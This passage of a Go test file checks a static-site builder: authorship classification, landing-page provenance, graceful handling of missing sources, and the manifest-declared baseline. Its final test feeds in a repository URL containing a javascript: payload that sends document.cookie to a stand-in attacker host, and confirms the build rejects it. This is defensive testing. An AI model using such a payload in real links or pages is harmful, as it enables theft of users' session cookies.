	if a.Authored != a.AssistedCommits+a.DeclaredNone+a.Undeclared {
		t.Errorf("authored %d != assisted %d + none %d + undeclared %d",
			a.Authored, a.AssistedCommits, a.DeclaredNone, a.Undeclared)
	}
	if a.Merges == 0 {
		t.Fatal("the fixture history has no merge, so the exclusion is untested")
	}

	// The noreply-derived profile reaches the export; every other author,
	// whose address is a real mailbox, has none (itd-140: graceful absence).
	profiles := map[string]string{}
	for _, h := range a.Humans {
		profiles[h.Name] = h.Profile
	}
	if profiles["Casey"] != "https://github.com/casey" {
		t.Errorf("the noreply author's profile is %q, want the forge page", profiles["Casey"])
	}
	if profiles["Fixture"] != "" {
		t.Errorf("a real mailbox derived a profile: %q", profiles["Fixture"])
	}
	names := map[string]bool{}
	for _, b := range a.Bots {
		names[b.Name] = true
	}
	if !names["depbot[bot]"] {
		t.Errorf("a forge bot is not in the bots row: %+v", a.Bots)
	}
	if !names["Assistant"] {
		t.Errorf("the pre-policy tool author is not in the bots row: %+v", a.Bots)
	}
	for _, h := range a.Humans {
		if names[h.Name] {
			t.Errorf("%q is in both rows", h.Name)
		}
	}
}

// TestAuthorshipVendorTokenDoesNotDemoteAHuman pins the other half of the rule
// above: the derivation is a MACHINE-IDENTITY test, not a name match.
//
// A trailer reads `Vendor:model`, and a vendor token is an ordinary word — a
// person whose git name is that word is not a tool, and the shortlog cannot tell
// the difference from the name alone. So the vendor half never decides by
// itself: it demotes only alongside an address that is structurally a machine's,
// which is what the pre-policy tool commit the test above pins actually carries.
// Without the conjunct a conformant trailer moved a HUMAN author's whole
// shortlog count into the bots-and-tools row (iss-2609081940550352).
//
// Both authors here are named for the same vendor and only the addresses differ,
// so nothing but the address rule can separate them.
func TestAuthorshipVendorTokenDoesNotDemoteAHuman(t *testing.T) {
	f := newFixture(t)
	// The person, at the forge privacy address a real contributor's commits
	// carry: a noreply HOST, but a mailbox named for the user rather than for a
	// machine.
	f.write("person.txt", "a change by a person\n")
	f.git("2026-03-07T09:00:00+00:00", "add", "-A")
	f.git("2026-03-07T09:00:00+00:00",
		"-c", "user.name=Nordic", "-c", "user.email=4242+nordic@users.noreply.github.com",
		"commit", "-m", "docs: a change by a person")
	// The tool of the same name, at an address no person reads.
	f.write("machine.txt", "a pre-policy commit\n")
	f.git("2026-03-08T09:00:00+00:00", "add", "-A")
	f.git("2026-03-08T09:00:00+00:00",
		"-c", "user.name=Nordic", "-c", "user.email=noreply@nordic.example.invalid",
		"commit", "-m", "chore: written before the trailer convention")
	// A conformant trailer naming that same word as the assisting vendor, which
	// is what registers it as one at all.
	f.write("assisted.txt", "assisted work\n")
	f.commitAt("2026-03-09T09:00:00+00:00", "feat: assisted work", "Nordic:nordic-model-1")

	a, err := LoadAuthorship(f.Root())
	if err != nil {
		t.Fatal(err)
	}
	charted := false
	for _, m := range a.ByModel {
		if m.Model == "Nordic:nordic-model-1" {
			charted = true
		}
	}
	if !charted {
		t.Fatalf("the trailer did not register the vendor at all: %+v", a.ByModel)
	}

	var human, machine int
	for _, h := range a.Humans {
		if h.Name == "Nordic" {
			human++
			if h.email != "4242+nordic@users.noreply.github.com" {
				t.Errorf("the wrong Nordic is in the humans row: %q", h.email)
			}
		}
	}
	for _, b := range a.Bots {
		if b.Name == "Nordic" {
			machine++
			if b.email != "noreply@nordic.example.invalid" {
				t.Errorf("the wrong Nordic is in the bots row: %q", b.email)
			}
		}
	}
	if human != 1 {
		t.Errorf("the humans row holds %d authors named Nordic, want the person alone: humans %+v, bots %+v",
			human, a.Humans, a.Bots)
	}
	if machine != 1 {
		t.Errorf("the bots row holds %d authors named Nordic, want the tool alone: humans %+v, bots %+v",
			machine, a.Humans, a.Bots)
	}
}

// TestBuildLandingCarriesProvenance asserts the property the single-source rule
// is checked through: every composed block names the file and heading it came
// from, and the only added words are ui.json's.
func TestBuildLandingCarriesProvenance(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()
	buildFixture(t, f, out)
	data, err := os.ReadFile(filepath.Join(out, "index.html"))
	if err != nil {
		t.Fatal(err)
	}
	html := string(data)

	for _, want := range []string{
		`data-src=".abcd/development/brief/01-product/README.md#identity-canonical"`,
		`data-src="docs/explanation/rationale.md"`,
		`data-src="docs/explanation/roles.md#product-thinker"`,
		`data-src="docs/explanation/artefacts.md#artefacts"`,
		`data-src="docs/explanation/process.md#capturing-intents"`,
		`data-src="docs/how-to/install.md#macos"`,
		`data-src=".abcd/development/intents/shipped/itd-2-the-shipped-one.md#press-release"`,
	} {
		if !strings.Contains(html, want) {
			t.Errorf("landing page carries no %s", want)
		}
	}

	// The feature block is derived: the shipped intent with a MET audit, not the
	// drafted one and not the one whose audit says otherwise.
	if !strings.Contains(html, "I stopped guessing") {
		t.Error("the feature block does not quote the shipped intent's press release")
	}
	if strings.Contains(html, "It has not been built") {
		t.Error("the feature block quotes a DRAFTED intent")
	}
	// itd-3 is shipped, audited MET, and newer than itd-2 — but its press
	// release is the mint placeholder. Quoting a template at a reader as this
	// page's one testimonial is worse than quoting nothing, so the derivation
	// falls through to the newest candidate that actually says something.
	// Both minted placeholders are skipped — the capture-seeded one (itd-3) and
	// the promotion-seeded one (itd-4), which is newer still.
	if strings.Contains(html, "Expand into the full press-release narrative") {
		t.Error("the feature block quotes an unwritten press release")
	}
	if strings.Contains(html, "Seeded by promotion from") {
		t.Error("the feature block quotes a promotion-seeded placeholder")
	}
	if !strings.Contains(html, "itd-2") {
		t.Error("the feature block did not fall through to the newest written press release")
	}
	// Exactly one acceptance criterion, as the manifest asks.
	if strings.Contains(html, "it does not appear in the quote") {
		t.Error("the feature block quotes more than the first acceptance criterion")
	}

	// The Beta badge is a rule on the release version, not a copy decision.
	if !strings.Contains(html, `<span class="beta">Beta</span>`) {
		t.Error("no Beta badge at a 0.x release")
	}
	// The SVG is inlined so its var(--token) colours follow the theme; the
	// raster is referenced from the copied file.
	if !strings.Contains(html, `<span class="svgasset artefact-brief"`) || !strings.Contains(html, "var(--ink, #000)") {
		t.Error("the SVG asset was not inlined")
	}
	if strings.Contains(html, `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" width="10"`) {
		t.Error("the inlined SVG kept its width attribute; the stylesheet must size it")
	}
	// Root-absolute: the same picture is referenced from `/` and from
	// `/record/<type>/<id>/`, and a relative src resolves at only one of them.
	if !strings.Contains(html, `<img src="/assets/img/intro.png"`) {
		t.Error("the raster was not referenced from the output tree at its served path")
	}
	// The install tab row: the manifest's left-hand section, then the CLI group.
	if !strings.Contains(html, `<button role="tab" id="tab-plugin" aria-selected="true"`) {
		t.Error("the Plugin tab is not the open one")
	}
	if !strings.Contains(html, `<div class="tabgroup"><span class="grp">CLI</span>`) {
		t.Error("the CLI group is not labelled from ui.json")
	}
	if !strings.Contains(html, `data-copied="copied"`) {
		t.Error("the copy button carries no ui.json label for its done state")
	}
}

// TestBuildWithoutChangelog is the graceful-absence rule (itd-140): a missing
// optional source omits what depends on it and the build still succeeds.
func TestBuildWithoutChangelog(t *testing.T) {
	f := newFixture(t)
	if err := os.Remove(filepath.Join(f.Root(), "CHANGELOG.md")); err != nil {
		t.Fatal(err)
	}
	out := t.TempDir()
	// No GeneratedAt either: with no releases there is no date to fall back on,
	// which is the path that actually runs when a repository has no changelog.
	res, err := Build(Request{RepoRoot: f.Root(), OutDir: out,
		Stamp: BuildStamp{Commit: "abcdef1"}})
	if err != nil {
		t.Fatalf("a repository with no CHANGELOG must still build: %v", err)
	}
	if res.Version != "" {
		t.Errorf("version without a changelog: %q", res.Version)
	}
	data, err := os.ReadFile(filepath.Join(out, "index.html"))
	if err != nil {
		t.Fatal(err)
	}
	html := string(data)
	if strings.Contains(html, `class="beta"`) {
		t.Error("the Beta badge rendered with no release to read a major version from")
	}
	if strings.Contains(html, `class="pill"`) {
		t.Error("the release pill rendered with no release")
	}
	// The copyright year comes from the build stamp; with nothing to date the
	// build from, the span is omitted rather than rendered without its year.
	if strings.Contains(html, "©") {
		t.Error("the footer rendered a copyright line with no year to put in it")
	}
	var exp RecordExport
	rec, err := os.ReadFile(filepath.Join(out, "record.json"))
	if err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(rec, &exp); err != nil {
		t.Fatal(err)
	}
	if len(exp.Releases) != 0 {
		t.Errorf("releases without a changelog: %+v", exp.Releases)
	}
	if len(exp.Nodes) == 0 {
		t.Error("the record vanished with the changelog")
	}
}

// TestBuildWithoutIdentityBlock is the same rule at the hero: the three spans
// the Identity block supplies are omitted, the headline and lede that carry the
// page stay, and the build succeeds.
func TestBuildWithoutIdentityBlock(t *testing.T) {
	f := newFixture(t)
	f.write(".abcd/development/brief/01-product/README.md", "# Product\n\nNo identity block here.\n")
	out := t.TempDir()
	if _, err := Build(Request{RepoRoot: f.Root(), OutDir: out, Stamp: fixtureStamp}); err != nil {
		t.Fatalf("a repository with no Identity block must still build: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(out, "index.html"))
	if err != nil {
		t.Fatal(err)
	}
	html := string(data)
	if strings.Contains(html, `class="eyebrow" data-src`) || strings.Contains(html, `class="tagline"`) {
		t.Error("the hero rendered Identity spans with no Identity block to render them from")
	}
	if !strings.Contains(html, "<h1 data-src=\"docs/explanation/rationale.md\">Who this is for</h1>") {
		t.Error("the headline did not survive the missing Identity block")
	}
}

// TestBuildWithoutManifest refuses rather than rendering a page from nothing.
func TestBuildWithoutManifest(t *testing.T) {
	f := newFixture(t)
	if err := os.Remove(filepath.Join(f.Root(), ".abcd", "site.json")); err != nil {
		t.Fatal(err)
	}
	_, err := Build(Request{RepoRoot: f.Root(), OutDir: t.TempDir(), Stamp: fixtureStamp})
	if err == nil {
		t.Fatal("a repository declaring no composition must not silently build one")
	}
	if !strings.Contains(err.Error(), ManifestRelPath) {
		t.Errorf("the refusal does not name the manifest: %v", err)
	}
}

// TestBaselineComesFromTheManifest pins the thread the manifest key is supposed
// to be. Declaring `checks.unresolved_reference_baseline` and having the build
// read a hardcoded path anyway is the parsed-and-dropped failure in its most
// consequential form: the ratchet a repo thinks it armed is not the one being
// measured against.
func TestBaselineComesFromTheManifest(t *testing.T) {
	f := newFixture(t)
	manifest := filepath.Join(f.Root(), ".abcd", "site.json")
	original, err := os.ReadFile(manifest)
	if err != nil {
		t.Fatal(err)
	}
	repoint := func(t *testing.T, to string) {
		t.Helper()
		body := strings.Replace(string(original),
			`"unresolved_reference_baseline": ".abcd/site-baseline.json"`,
			`"unresolved_reference_baseline": "`+to+`"`, 1)
		if body == string(original) {
			t.Fatal("the fixture manifest does not declare a baseline")
		}
		if err := os.WriteFile(manifest, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
		t.Cleanup(func() { os.WriteFile(manifest, original, 0o644) })
	}

	t.Run("a named baseline that does not exist refuses", func(t *testing.T) {
		repoint(t, ".abcd/no-such-baseline.json")
		_, err := Build(Request{RepoRoot: f.Root(), OutDir: t.TempDir(), Stamp: fixtureStamp})
		if err == nil {
			t.Fatal("the build measured against a baseline the manifest names but the repo does not carry")
		}
		if !strings.Contains(err.Error(), "no-such-baseline.json") {
			t.Errorf("the refusal does not name the missing baseline: %v", err)
		}
	})

	// The board is documented as read-only and exit-0 whatever it finds. A
	// missing declared baseline is exactly the kind of thing somebody runs the
	// board to DISCOVER, so it has to be reportable state there — while staying
	// a refusal in `build`, which would otherwise publish a health count
	// measured against nothing.
	t.Run("the board reports a missing declared baseline rather than failing", func(t *testing.T) {
		repoint(t, ".abcd/no-such-baseline.json")
		st, err := Describe(f.Root(), "site")
		if err != nil {
			t.Fatalf("the status board failed on a missing baseline: %v", err)
		}
		if st.Baseline {
			t.Error("the board reports a baseline it could not read as present")
		}
		if st.BaselinePath != ".abcd/no-such-baseline.json" {
			t.Errorf("the board reports %q, not the declared path", st.BaselinePath)
		}
		if st.BaselineN != 0 {
			t.Errorf("the board counts %d entries from a baseline it could not read", st.BaselineN)
		}
	})

	t.Run("the board reports an unreadable baseline rather than failing", func(t *testing.T) {
		broken := ".abcd/broken-baseline.json"
		if err := os.WriteFile(filepath.Join(f.Root(), filepath.FromSlash(broken)), []byte("{not json"), 0o644); err != nil {
			t.Fatal(err)
		}
		repoint(t, broken)
		st, err := Describe(f.Root(), "site")
		if err != nil {
			t.Fatalf("the status board failed on an unreadable baseline: %v", err)
		}
		if st.Baseline || st.BaselineN != 0 {
			t.Errorf("the board treated an unreadable baseline as present: %+v", st)
		}
		if st.BaselinePath != broken {
			t.Errorf("the board reports %q, not the declared path", st.BaselinePath)
		}
	})

	t.Run("an alternate baseline is the one counted", func(t *testing.T) {
		alt := ".abcd/other-baseline.json"
		if err := os.WriteFile(filepath.Join(f.Root(), filepath.FromSlash(alt)), []byte(`{
  "schema_version": 1,
  "unresolved_references": [
    {"from": "adr-2", "to": "adr-9"},
    {"from": "itd-9", "to": "spc-9"},
    {"from": "itd-8", "to": "spc-8"}
  ]
}
`), 0o644); err != nil {
			t.Fatal(err)
		}
		repoint(t, alt)
		out := t.TempDir()
		res, err := Build(Request{RepoRoot: f.Root(), OutDir: out, Stamp: fixtureStamp})
		if err != nil {
			t.Fatal(err)
		}
		if res.Baseline != 3 {
			t.Errorf("baseline count: %d, want 3 — the manifest's baseline is the one measured against", res.Baseline)
		}
		st, err := Describe(f.Root(), "site")
		if err != nil {
			t.Fatal(err)
		}
		if st.BaselinePath != alt {
			t.Errorf("the status board reports %q, not the path it used (%q)", st.BaselinePath, alt)
		}
		if st.BaselineN != 3 {
			t.Errorf("the status board counts %d, want 3", st.BaselineN)
		}
	})
}

// TestDescribeIsReadOnly pins the bare verb: it reports and writes nothing.
func TestDescribeIsReadOnly(t *testing.T) {
	f := newFixture(t)
	st, err := Describe(f.Root(), "site")
	if err != nil {
		t.Fatal(err)
	}
	if !st.Manifest || !st.UIStrings || !st.Baseline {
		t.Errorf("status: %+v", st)
	}
	if st.Chapters != 4 {
		t.Errorf("chapters: %d", st.Chapters)
	}
	if st.OutExists {
		t.Error("status reports an output directory nothing built")
	}
	if _, err := os.Stat(filepath.Join(f.Root(), "site")); !os.IsNotExist(err) {
		t.Error("describing the site created the output directory")
	}
}

func containsString(xs []string, x string) bool {
	for _, v := range xs {
		if v == x {
			return true
		}
	}
	return false
}

// TestLoadRepoMetaRefusesExecutableRepository proves the repository address is
// screened for an executable scheme like the bibliography URLs are: it becomes an
// href on every emitted page, so a javascript: address must fail the build rather
// than be escaped into the markup.
func TestLoadRepoMetaRefusesExecutableRepository(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Join(root, ".claude-plugin")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	manifest := `{"name":"x","description":"d","author":{"name":"a"},"repository":"javascript:fetch('//evil.invalid/'+document.cookie)","license":"MIT"}`
	if err := os.WriteFile(filepath.Join(dir, "plugin.json"), []byte(manifest), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadRepoMeta(root); err == nil {
		t.Fatal("LoadRepoMeta accepted a javascript: repository address")
	} else if !strings.Contains(err.Error(), "javascript") {
		t.Errorf("refusal does not name the scheme: %v", err)
	}

	// A normal https repository still loads.
	ok := `{"name":"x","description":"d","author":{"name":"a"},"repository":"https://example.invalid/x/repo","license":"MIT"}`
	if err := os.WriteFile(filepath.Join(dir, "plugin.json"), []byte(ok), 0o644); err != nil {
		t.Fatal(err)
	}
	if m, err := LoadRepoMeta(root); err != nil {
		t.Fatalf("LoadRepoMeta rejected a valid https repository: %v", err)
	} else if m.Repository != "https://example.invalid/x/repo" {
		t.Errorf("repository not loaded: %q", m.Repository)
	}
}
